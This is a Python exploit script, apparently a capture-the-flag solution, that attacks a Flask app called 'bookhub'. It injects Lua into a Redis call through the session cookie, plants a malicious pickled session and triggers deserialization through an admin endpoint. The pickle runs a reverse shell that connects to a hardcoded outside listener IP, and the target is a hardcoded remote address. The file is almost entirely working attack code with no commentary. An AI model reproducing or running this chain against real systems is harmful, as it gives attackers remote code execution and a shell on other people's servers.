# -*- coding:utf-8 -*-

import requests
import re
import json
import random
import string
import cPickle
import os
import urllib

req = requests.Session()

DEBUG = 0

URL = "http://18.213.16.123:5000/" if not DEBUG else "http://127.0.0.1:5000/"


def rs(n=6):
    return ''.join(random.sample(string.ascii_letters + string.digits, n))


class exp(object):

    def __reduce__(self):
        listen_ip = "123.207.90.143"
        listen_port = 1234
        s = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'' % (
            listen_ip, listen_port)
        return (os.system, (s,))

x = [{'_fresh': False, '_permanent': True,
      'csrf_token': '2f898d232024ac0e0fc5f5e6fdd3a9a7dad462e8', 'exp': exp()}]
s = cPickle.dumps(x)

if __name__ == '__main__':
    payload = urllib.quote(s)
    yoursid = 'vvv'
    funcode = r"local function urlDecode(s) s = string.gsub(s, '%%(%x%x)', function(h) return string.char(tonumber(h, 16)) end) return s end"
    # 插入payload并防止del
    sid = '%s\\" } %s ' % (rs(6), funcode) + \
        'redis.call(\\"set\\",\\"bookhub:session:%s\\",\\urlDecode("%s\\")) inputs = { \"bookhub:session:%s\" } --' % (
            yoursid, payload, yoursid)
    headers = {
        "Cookie": 'bookhub-session="x%s"' % sid,
        "Content-Type": "application/x-www-form-urlencoded",
        'X-CSRFToken': '',
    }

    res = req.get(URL + 'login/', headers=headers)
    if res.status_code == 200:
        html = res.content
        r = re.findall(r'csrf_token" type="hidden" value="(.*?)">', html)
        if r:
            headers['X-CSRFToken'] = r[0]
            # refresh_session
            data = {'submit': '1'}
            res = req.post(URL + 'admin/system/refresh_session/',
                           data=data, headers=headers)
            if res.status_code == 200:
                print(res.content)
            else:
                print(res.content)
            # fuck
            headers['Cookie'] = 'bookhub-session=vvv'
            res = req.get(URL + 'admin/', headers=headers)
            if res.status_code == 200:
                print(res.content)
            else:
                print(res.content)